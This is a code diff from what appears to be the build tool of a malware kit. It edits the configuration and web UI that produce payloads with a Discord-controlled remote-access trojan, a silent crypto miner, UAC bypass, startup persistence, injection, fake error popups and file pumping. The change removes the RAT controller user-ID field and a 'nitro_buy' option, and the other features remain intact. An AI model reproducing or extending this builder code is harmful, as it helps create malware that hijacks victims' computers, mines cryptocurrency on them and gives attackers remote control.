@@ -58,14 +58,12 @@ data_builder = {
     "knight_rat": False,
     "knight_bot_token": "",
     "knight_channel_id": "",
-    "knight_user_id": "",
     "knight_prefix": "",
     "screenshot": False,
     "ping": False,
     "fake_error": False,
     "silent_crypto_miner": False,
     "wallet_adress": "",
-    "nitro_buy": False,
     "file_pumper": False,
     "file_pumper_size": "",
     "uac_bypass": False,
@@ -242,7 +240,6 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("knight_discord_rat = False", f"knight_discord_rat = {data_builder['knight_rat']}") \
                 .replace("KNIGHT_DISCORD_RAT_BOT_TOKEN", f"{data_builder['knight_bot_token']}") \
                 .replace("KNIGHT_DISCORD_RAT_CHANNEL_ID", f"{data_builder['knight_channel_id']}") \
-                .replace("KNIGHT_DISCORD_RAT_LISTENER_USER_ID", f"{data_builder['knight_user_id']}") \
                 .replace("KNIGHT_DISCORD_RAT_PREFIX", f"{data_builder['knight_prefix']}") \
                 .replace("start_up = False", f"start_up = {data_builder['startup']}") \
                 .replace("injection = False", f"injection = {data_builder['injection']}") \
@@ -607,8 +604,6 @@ def _features():
                             on_change=lambda e: change_data('knight_bot_token', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                         ui.input(label='Knight-RAT Channel ID', placeholder='Knight on top baby',
                             on_change=lambda e: change_data('knight_channel_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
-                        ui.input(label='Knight-RAT Controller User ID', placeholder='Put your user ID here',
-                            on_change=lambda e: change_data('knight_user_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                         ui.input(label='Knight-RAT Command Prefix', placeholder='Knight on top baby',
                             on_change=lambda e: change_data('knight_prefix', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                 
